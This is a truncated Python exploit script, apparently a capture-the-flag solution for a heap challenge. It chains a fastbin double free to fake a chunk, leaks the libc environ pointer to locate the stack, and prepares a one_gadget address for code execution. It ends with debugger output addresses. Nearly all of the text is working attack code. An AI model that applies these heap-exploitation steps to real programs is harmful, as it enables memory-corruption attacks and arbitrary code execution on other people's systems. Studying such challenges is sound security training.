...
def exp():
  ...
  one_gadget = libc_base + one_gadget_offset3
  ...
  delete(6)
  delete(7) 
  delete(5) #fastbin: 5->7->6->5
  add(0x28, '9') #9 header = 5, 9 body = 7
  add(0x28, p64(1) + p64(environ)) #a header = 6, a body = 5, fake a.inuse = 1, a.name=environ
  
  show()
  p.recvuntil('Name[9] :')
  data = p.recvuntil('\n', drop=True)
  environ_addr = u64(data.ljust(8,'\0'))
  print 'environ_addr= ' + hex(environ_addr)
  
  # need to free enough 0x30 chunk for following attack, since bin-0x30 is faked to be 0x1 before!!!
  delete(6)
  delete(7)
  delete(5)
  delete(6) #fast: 6->5->7->6
  
  '''
  environ_addr= 0x7fff9132ccb8
  breakpoint at: 0x55e9df4c0d82    call   0x55e9df4c09f8
  RSP  0x7fff9132cb60
